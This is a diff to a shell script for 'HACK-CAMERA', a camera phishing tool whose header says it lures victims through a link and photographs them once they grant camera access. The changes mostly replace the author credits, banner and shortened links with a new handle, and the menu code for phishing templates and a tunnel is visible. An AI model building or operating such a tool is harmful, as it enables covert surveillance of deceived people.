@@ -3,10 +3,10 @@
 # HACK-CAMERA 
 # Version    : 2.1
 # Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : HACK0F2020
-# Github     : https://github.com/HACK0F2020
-# Join Us    : 
-# Date       : 
+# Author     : X PHANTOM PH4N70M
+# Github     : https://github.com/hackerxphantom
+# Join Us    : https://bit.ly/3PV3S3r
+# Date       : 29-05-2022
 # Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -41,7 +41,7 @@ ${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \
 ${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
 ${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
 ${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
-${Red}                                               [By HACK0F2020 (MD4T)]
+${green}                                               [By X PHANTOM (PH4N7OM)]
 "
 
 # Package Installer
@@ -368,7 +368,7 @@ ${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 
 sleep 1
-printf "${cyan}\nHACK0F2020${nc}@${blue}MD4T ${red}$ ${nc}"
+printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -376,7 +376,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nHACK0F2020${nc}@${blue}MD4T ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -387,7 +387,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nHACK0F2020${nc}@${blue}MD4T ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -405,7 +405,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nHACK0F2020${nc}@${blue}MD4T ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -421,14 +421,14 @@ read option
         echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
 $red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[HACK0F2020 MD4T]
-$red[Github]     ${cyan} :[https://github.com/HACK0F2020] 
-$red[Join us]    ${cyan} :[https://bit.ly/4MTD4S4r]
-$red[Telegarm]   ${cyan} :[https://t.me/HACK0F2020]"
-printf "${cyan}\nHACK0F2020${nc}@${cyan}MD4T ${red}$ ${nc}"
+$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
+$red[Github]     ${cyan} :[https://github.com/hackerxphantom] 
+$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
+$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
+printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://bit.ly/4MT4S4r"
+        xdg-open "https://bit.ly/3PV3S3r"
     elif echo $option | grep -q "0"; then
         exit 0
     else
